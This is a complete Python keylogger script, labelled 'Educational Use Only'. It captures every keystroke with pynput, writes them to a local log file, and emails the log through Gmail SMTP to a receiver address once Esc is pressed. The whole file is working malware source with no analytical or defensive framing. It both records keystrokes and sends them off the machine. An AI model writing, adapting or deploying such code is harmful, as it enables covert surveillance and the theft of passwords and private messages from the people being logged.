
# Keylogger by Mecktro
# Educational Use Only

import smtplib
import ssl
from pynput import keyboard

# User Configuration (Replace with actual values securely)
sender_email = input("Enter sender email: ")
receiver_email = input("Enter receiver email: ")
password = input("Enter email password: ")

# Logging keystrokes to a file
def write_to_log(text):
    with open("keylogger.txt", "a") as log_file:
        log_file.write(text)

# Key Press Handler
def on_key_press(key):
    try:
        write_to_log(key.char if hasattr(key, "char") else f"<{key}>")
    except AttributeError:
        write_to_log(f"<{key}>")

# Key Release Handler
def on_key_release(key):
    if key == keyboard.Key.esc:
        return False

# Send email with log file content
def send_email():
    with open("keylogger.txt", "r") as log_file:
        log_content = log_file.read()
    context = ssl.create_default_context()
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls(context=context)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, f"Subject: Key Logs\n\n{log_content}")

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()
    send_email()
